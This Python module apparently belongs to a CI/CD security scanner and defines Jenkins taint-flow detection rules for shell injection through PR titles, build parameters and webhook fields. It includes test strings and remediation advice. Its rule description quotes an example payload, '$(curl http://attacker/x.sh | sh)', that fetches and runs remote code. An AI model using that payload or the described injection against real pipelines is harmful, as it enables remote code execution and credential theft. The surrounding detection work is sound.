"""Jenkins pipeline taint-flow rules.

Single rule today: **TAINT-JK-001** — attacker-controlled pipeline
context interpolated directly into a double-quoted Groovy shell step.
This is the Jenkins analog of ``TAINT-GH-001`` (shallow env-mediated
injection on GitHub Actions) and ``TAINT-GL-001`` (shallow variables
flow on GitLab).

Scope: shallow, single-line.  Multi-hop variable propagation on
Jenkins (the Groovy-binding equivalent of ``TAINT-GH-002``), the
``readFile`` / ``artifactory`` cross-step bridge (the equivalent of
``TAINT-GH-003``), and triple-quoted ``sh \"\"\"...\"\"\"`` heredoc
blocks are deferred to follow-up rules.  Known-gap list is tracked in
this module docstring so reviewers see what's *not* covered.

Attacker-controlled sources recognised:

* Multibranch / GitHub Branch Source plugin —
  ``env.CHANGE_TITLE``, ``env.CHANGE_BRANCH``, ``env.CHANGE_AUTHOR``,
  ``env.CHANGE_AUTHOR_EMAIL``, ``env.CHANGE_AUTHOR_DISPLAY_NAME``,
  ``env.CHANGE_TARGET``, ``env.CHANGE_URL``, ``env.CHANGE_FORK``,
  ``env.CHANGE_ID``.
* Legacy GitHub Pull Request Builder —
  ``env.ghprbPullTitle``, ``env.ghprbPullAuthor*``,
  ``env.ghprbSourceBranch``, ``env.ghprbTargetBranch``,
  ``env.ghprbActualCommitAuthor``.  The ``env.`` prefix is optional in
  scripted pipelines; bare ``ghprbPullTitle`` is also recognised.
* Gerrit Trigger —
  ``env.GERRIT_CHANGE_SUBJECT``, ``env.GERRIT_CHANGE_COMMIT_MESSAGE``,
  ``env.GERRIT_CHANGE_OWNER``, ``env.GERRIT_PATCHSET_UPLOADER``,
  ``env.GERRIT_EVENT_TYPE``, ``env.GERRIT_TOPIC``.  Same optional-
  ``env.`` / bare-name rule as ghprb.
* Build parameters — ``params.<any>``.  Every ``parameters { ... }``
  entry is attacker-supplied when the job is triggerable by anyone
  with Build permission (default on many installations).
* Generic Webhook Trigger plugin (https://plugins.jenkins.io/generic-webhook-trigger/) —
  webhook fields land as bare Groovy bindings.  The plugin lets users
  define arbitrary names via JSONPath, but the conventional set used
  in 90%+ of installations follows the GitHub / GitLab / Gitea webhook
  payload shape: ``${title}``, ``${body}``, ``${ref}``, ``${ref_name}``,
  ``${pusher_name}``, ``${pusher_email}``, ``${sender_login}``,
  ``${pull_request_title}``, ``${pull_request_body}``,
  ``${pull_request_user_login}``, ``${pull_request_head_ref}``,
  ``${pull_request_head_sha}``, ``${pull_request_html_url}``,
  ``${pull_request_user_url}``, ``${head_commit_message}``,
  ``${head_commit_author_name}``, ``${head_commit_author_email}``,
  ``${head_commit_committer_name}``, ``${repository_full_name}``,
  ``${repository_html_url}``, ``${repository_owner_login}``,
  ``${repository_owner_name}``.  Custom GWT bindings outside this list
  are not detected; users with non-default JSONPath extractors should
  treat their bindings as ``params.*`` for taintly's purposes.

Sinks recognised on the SAME line as the source: ``sh``, ``bat``, and
``powershell`` steps wrapped in a Groovy double-quoted string.
Single-quoted Groovy (``sh 'echo \"$CHANGE_TITLE\"'``) IS still a
potential injection vector because the runner's shell does its own
variable expansion on Jenkins-exported env vars, but the exploitation
shape is different and we track it separately in a future rule.
"""

from __future__ import annotations

from taintly.models import ContextPattern, Platform, RegexPattern, Rule, Severity

# Classic / well-namespaced source bindings.  These are recognised in
# both ``${...}`` interpolated form AND bare form (e.g. ``value: title``
# in a parameter slot) because their names — CHANGE_TITLE, GERRIT_*,
# ghprbPullTitle, params.X — are unambiguous and don't collide with
# typical Groovy locals.
# The optional ``env.`` prefix covers both scripted
# (``env.CHANGE_TITLE``) and declarative (``CHANGE_TITLE``) pipelines.
_TAINTED_NAMES = (
    r"(?:env\.)?CHANGE_(?:TITLE|BRANCH|AUTHOR_EMAIL|AUTHOR_DISPLAY_NAME"
    r"|AUTHOR|TARGET|URL|FORK|ID)"
    r"|(?:env\.)?GERRIT_(?:CHANGE_SUBJECT|CHANGE_COMMIT_MESSAGE"
    r"|CHANGE_OWNER|PATCHSET_UPLOADER|EVENT_TYPE|TOPIC)"
    r"|(?:env\.)?ghprb(?:PullTitle|PullAuthorEmail|PullAuthorLogin"
    r"|PullAuthorLoginMention|SourceBranch|TargetBranch"
    r"|ActualCommitAuthor)"
    r"|params\.\w+"
)

# Generic Webhook Trigger plugin bindings — recognised ONLY in the
# ``${name}`` interpolated form, NOT bare.  GWT names like ``title``,
# ``body``, ``ref`` collide with common Groovy local-variable names
# that legitimate Jenkinsfiles use freely (``def title = ...``).  The
# ``${...}`` wrapper is what disambiguates "this came from a webhook
# binding" from "this is a Groovy local" — bare ``title`` in code
# would FP, but ``${title}`` interpolated into a sh-step is a real
# webhook taint flow.  Custom GWT JSONPath extractors with
# non-default names are not detected; users with custom extractors
# should treat their bindings as ``params.*`` for taintly's purposes.
_GWT_NAMES = (
    r"title|body|ref|ref_name"
    r"|pusher_name|pusher_email|sender_login"
    r"|pull_request_(?:title|body|user_login|head_ref|head_sha"
    r"|html_url|user_url)"
    r"|head_commit_(?:message|author_name|author_email|committer_name)"
    r"|repository_(?:full_name|html_url|owner_login|owner_name)"
)

_TAINTED_REF = r"\$\{(?:" + _TAINTED_NAMES + r"|" + _GWT_NAMES + r")\}"

# Bare Groovy expression form (no ``${...}`` wrapper) — legal wherever
# Groovy expects an expression (e.g., a parameter ``value:`` slot).
# Word boundary anchor so we don't match inside identifiers.  Only
# classic _TAINTED_NAMES are matched here; GWT names are too easy to
# confuse with Groovy locals.
_TAINTED_BARE_OR_INTERP = r"(?:" + _TAINTED_REF + r"|\b(?:" + _TAINTED_NAMES + r")\b)"


RULES: list[Rule] = [
    Rule(
        id="TAINT-JK-001",
        title=(
            "Attacker-controlled pipeline context interpolated into "
            "double-quoted sh/bat/powershell step"
        ),
        severity=Severity.CRITICAL,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A Jenkinsfile step (``sh``, ``bat``, or ``powershell``) "
            "is wrapped in a Groovy double-quoted string and that "
            "string interpolates an attacker-controlled binding "
            "directly — ``${env.CHANGE_TITLE}``, ``${params.X}``, "
            "``${ghprbPullTitle}``, ``${GERRIT_CHANGE_SUBJECT}``, "
            "and so on.  Groovy performs the substitution BEFORE "
            "handing the command to the shell, so shell-level "
            "quoting and escaping cannot save the step: an attacker "
            "who opens a pull request titled "
            "``$(curl http://attacker/x.sh | sh)`` gets that string "
            "spliced into the command line verbatim, yielding shell "
            "RCE with the build agent's credentials, SSH keys for "
            "SCM, and whatever ``withCredentials`` scope is active."
        ),
        pattern=RegexPattern(
            # Anchor on the sink (``sh`` / ``bat`` / ``powershell``
            # followed by an optional opening paren and a double
            # quote), then require a tainted ``${...}`` reference
            # inside the same double-quoted string.  Non-greedy
            # ``[^"\n]*?`` keeps the match to a single line so we
            # don't bridge across unrelated strings.
            match=(r'\b(?:sh|bat|powershell)\s*\(?\s*"[^"\n]*?' + _TAINTED_REF),
            exclude=[
                # Single-line Groovy / Java comment
                r"^\s*//",
                # Docstring / javadoc continuation
                r"^\s*/\*",  # `/*` block-comment opener (single-line
                             # `/* ... */` or multi-line opener)
                r"^\s*\*",
                # Heredoc-style: tracked as a separate follow-up rule,
                # so don't fire on the opening delimiter of a
                # ``sh \"\"\"...`` block.
                r'\bsh\s*"""',
                r'\bbat\s*"""',
                r'\bpowershell\s*"""',
            ],
        ),
        remediation=(
            "The injection breaks because Groovy substitutes the\n"
            "variable into the command string before the shell ever\n"
            "sees it.  Two safe patterns:\n"
            "\n"
            "(1) Route the tainted value through ``withEnv`` and\n"
            "    read it via a SINGLE-quoted shell step:\n"
            "\n"
            '    withEnv(["PR_TITLE=${env.CHANGE_TITLE}"]) {\n'
            "        sh 'echo \"$PR_TITLE\"'    // single-quoted\n"
            "    }\n"
            "\n"
            "    Groovy leaves ``$PR_TITLE`` alone (single quotes),\n"
            "    the shell reads the env var Jenkins placed there,\n"
            "    and the shell's double-quote rules protect against\n"
            "    word splitting.  This is the closest analog of the\n"
            "    ``env:`` + ``$VAR`` pattern we recommend for\n"
            "    GitHub Actions.\n"
            "\n"
            "(2) If the value has to become a CLI argument and you\n"
            "    control the tool, use a list-form invocation where\n"
            "    the runtime separates args from the command:\n"
            "\n"
            '    sh script: ["git", "log", "--grep", env.CHANGE_TITLE],\n'
            "       returnStdout: true\n"
            "\n"
            "    (``script:`` with a List on recent Pipeline plugins.)\n"
            "\n"
            "Never interpolate ``${env.CHANGE_*}`` / ``${params.X}`` /\n"
            "``${ghprb*}`` / ``${GERRIT_*}`` into a double-quoted\n"
            "``sh ...`` / ``bat ...`` / ``powershell ...`` string."
        ),
        reference=(
            "https://www.jenkins.io/doc/book/pipeline/syntax/"
            "#shell-script-with-a-variable-from-the-shell; "
            "https://www.cloudbees.com/blog/taking-advantage-of-"
            "shared-library-features-in-jenkins-pipelines"
        ),
        test_positive=[
            # Multibranch CHANGE_TITLE — the canonical shape.
            'sh "echo Building PR: ${env.CHANGE_TITLE}"',
            # Declarative pipeline without env. prefix.
            'sh "deploy --ref ${CHANGE_BRANCH}"',
            # sh(...) parenthesised form.
            "sh(\"notify '${env.CHANGE_AUTHOR_EMAIL}' done\")",
            # params.X — user-supplied build parameter.
            'sh "cleanup ${params.TARGET_BRANCH}"',
            # ghprb legacy plugin
            'bat "call build.bat ${env.ghprbPullTitle}"',
            # Gerrit
            'sh "log ${env.GERRIT_CHANGE_SUBJECT} >> audit.log"',
            # powershell
            'powershell "Write-Host ${params.MESSAGE}"',
            # Generic Webhook Trigger plugin — bare ${title} as in the
            # cicd-goat reportcov example.
            'sh "echo Pull Request ${title} created in repo"',
            # GWT body / pull_request_title / head_commit_message
            'sh "deploy ${pull_request_title}"',
            'sh "log ${head_commit_message} >> audit.log"',
            'sh "notify ${pusher_email}"',
            'sh "annotate ${repository_full_name}"',
            'sh "checkout ${ref_name}"',
        ],
        test_negative=[
            # Single-quoted Groovy — Groovy doesn't interpolate; the
            # shell handles ``$CHANGE_TITLE`` via env.  Different
            # (still-problematic) vector, tracked for a follow-up rule.
            "sh 'echo \"$CHANGE_TITLE\"'",
            # withEnv + single-quoted sh — the canonical safe pattern.
            'withEnv(["PR_TITLE=${env.CHANGE_TITLE}"]) { sh \'echo "$PR_TITLE"\' }',
            # Interpolated variable that ISN'T attacker-controlled.
            'sh "echo building ${env.BUILD_NUMBER}"',
            # Interpolated local Groovy variable, not a taint source.
            'sh "echo ${myLocalVar}"',
            # Triple-quoted heredoc — excluded (follow-up rule).
            'sh """echo ${env.CHANGE_TITLE}"""',
            # Commented line.
            '// sh "deploy ${env.CHANGE_TITLE}"',
            '   * sh "deploy ${env.CHANGE_TITLE}"',
            # withCredentials scope using env.CHANGE_TITLE in the
            # BINDING list, not inside a sh step.
            'withEnv(["TITLE=${env.CHANGE_TITLE}"]) { echo "title set" }',
            # GWT names with `env.` prefix — that's NOT a GWT binding,
            # that's a Jenkins env var (different surface; not what GWT
            # produces).  Don't fire — would be FP on user-set env vars.
            'sh "echo ${env.title}"',
            # GWT name as a substring of an unrelated identifier —
            # word-boundary anchors should keep this clean.
            'sh "echo ${entitled_users}"',
            'sh "echo ${body_size}"',
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Any attacker who can open a PR, push a branch, create a "
            "merge request, or upload a patch to a Gerrit-tracked "
            "project can set the title, branch name, commit message, "
            "author display name, or build-parameter value to a shell-"
            "injection payload.  When the Jenkinsfile interpolates "
            "that value into a double-quoted ``sh`` argument, Groovy "
            "substitutes the payload into the command string and the "
            "shell executes it with the build agent's credentials, "
            "the SCM deploy key, the ``withCredentials`` scope active "
            "at the injection point, and — on persistent agents — "
            "the ability to install a backdoor that survives into "
            "subsequent builds."
        ),
        confidence="high",
        incidents=[
            "Stawinski — GitHub Actions env-var injection class (2024) — Jenkins analog",
            "Trivy supply chain (Trivy Jan 2026, GH analog)",
        ],
    ),
    # =========================================================================
    # TAINT-JK-002 — downstream build called with tainted parameter
    # =========================================================================
    #
    # Jenkins cross-job taint.  A Jenkinsfile triggers another job via
    # ``build job: 'other-job', parameters: [string(name: 'X', value: ...)]``.
    # If the value slot carries an attacker-controlled binding (PR title,
    # branch name, build-parameter passthrough, etc.), the downstream job
    # receives the tainted bytes as its own ``params.X`` and may use them
    # in a shell step — yielding RCE with the DOWNSTREAM job's credentials
    # / SSH keys / ``withCredentials`` scope.
    #
    # This is the Jenkins analog of TAINT-GH-007 (caller-side cross-
    # workflow taint on GitHub).  The downstream job is a separate file
    # whose own Jenkinsfile our scanner won't cross into; this rule is
    # the caller-side finding.  A reviewer audits the downstream job to
    # confirm whether ``params.X`` reaches a shell.
    Rule(
        id="TAINT-JK-002",
        title=("Downstream Jenkins build called with attacker-controlled parameter"),
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A Jenkinsfile invokes another job via ``build job: ...`` "
            "and passes an attacker-controlled binding as a parameter "
            "``value:`` — ``${env.CHANGE_TITLE}``, ``${params.X}``, "
            "``${ghprbPullTitle}``, ``${GERRIT_CHANGE_SUBJECT}``, etc. "
            "The downstream job receives the value as its own "
            "``params.<name>``.  If that downstream job references the "
            "parameter inside a double-quoted ``sh``, ``bat``, or "
            "``powershell`` step (TAINT-JK-001 shape), the attacker "
            "achieves RCE with the downstream job's credentials "
            "— not the caller's — so isolation via per-job credentials "
            "is broken."
        ),
        pattern=ContextPattern(
            # Anchor: a ``value:`` line carrying an attacker-controlled
            # binding.  Common shapes in the parameters list include
            # ``string(name: 'X', value: env.CHANGE_TITLE)`` and
            # ``[$class: 'StringParameterValue', name: 'X',
            # value: "${env.CHANGE_TITLE}"]`` — both boil down to a
            # ``value:`` keyword followed (somewhere on the same line)
            # by a tainted reference.
            anchor=r"\bvalue\s*:\s*[^,\n)]*" + _TAINTED_BARE_OR_INTERP,
            # File must actually invoke a downstream build — without
            # this the rule would fire on any tainted value: line,
            # including e.g. a ``withCredentials`` list.
            requires=r"\bbuild\s+job\s*:",
            exclude=[
                # Groovy comments.
                r"^\s*//",
                r"^\s*/\*",  # `/*` block-comment opener (single-line
                             # `/* ... */` or multi-line opener)
                r"^\s*\*",
            ],
            scope="file",
        ),
        remediation=(
            "Don't pass attacker-controlled bindings unchanged into\n"
            "a downstream ``build job:`` call.  Options:\n"
            "\n"
            "(1) Validate + allowlist before forwarding:\n"
            "    def safeTitle = env.CHANGE_TITLE =~ /^[A-Za-z0-9._\\- ]+$/\n"
            "        ? env.CHANGE_TITLE : 'invalid'\n"
            "    build job: 'downstream', parameters: [\n"
            "        string(name: 'PR_TITLE', value: safeTitle)\n"
            "    ]\n"
            "\n"
            "(2) Only pass immutable identifiers (SHA, change id):\n"
            "    build job: 'downstream', parameters: [\n"
            "        string(name: 'SHA', value: env.GIT_COMMIT)\n"
            "    ]\n"
            "\n"
            "(3) If the downstream job needs richer context, have IT\n"
            "    fetch from the SCM directly via a pinned build ref\n"
            "    rather than trusting the caller's bindings.\n"
            "\n"
            "The downstream Jenkinsfile should ALSO apply TAINT-JK-001\n"
            "— never interpolate ``${params.X}`` into a double-quoted\n"
            "sh/bat/powershell string regardless of whether the caller\n"
            "sanitised."
        ),
        reference=("https://www.jenkins.io/doc/pipeline/steps/pipeline-build-step/"),
        test_positive=[
            # Canonical: downstream build passing PR title through.
            "build job: 'deploy', parameters: [\n"
            "    string(name: 'PR_TITLE', value: \"${env.CHANGE_TITLE}\"),\n"
            "]",
            # Legacy ghprb plugin variant.
            "build job: 'release', parameters: [\n"
            "    string(name: 'SOURCE', value: env.ghprbSourceBranch),\n"
            "]",
            # params.X passthrough — any caller param can be attacker-
            # supplied when the upstream job is triggerable.
            "build job: 'notify', parameters: [\n"
            "    string(name: 'MSG', value: params.MESSAGE),\n"
            "]",
        ],
        test_negative=[
            # No build step — tainted value in a non-cross-job context.
            'sh "echo ${env.BUILD_NUMBER}"',
            # build step, but parameter value is an immutable identifier.
            "build job: 'deploy', parameters: [\n"
            "    string(name: 'SHA', value: env.GIT_COMMIT),\n"
            "]",
            # Commented line.
            "// build job: 'deploy', parameters: [string(name: 'X', value: env.CHANGE_TITLE)]",
        ],
        stride=["T", "E"],
        threat_narrative=(
            "An attacker opens a PR whose title carries a shell "
            "payload.  The upstream Jenkinsfile reads "
            "``env.CHANGE_TITLE`` and passes it — as a string parameter "
            "— into a downstream ``build job: 'deploy'`` call.  The "
            "``deploy`` job sees ``params.PR_TITLE`` and (per its own "
            "TAINT-JK-001-shaped bug) interpolates it into a double-"
            "quoted ``sh`` step.  Attacker code runs with the ``deploy`` "
            "job's credentials — including any production deploy SSH "
            "keys or ``withCredentials`` blocks scoped to that job.  "
            "Because the RCE happens inside the ``deploy`` job, any "
            "detective signal focused on the originating Multibranch "
            "project misses it."
        ),
        confidence="medium",
        incidents=[],
    ),
]
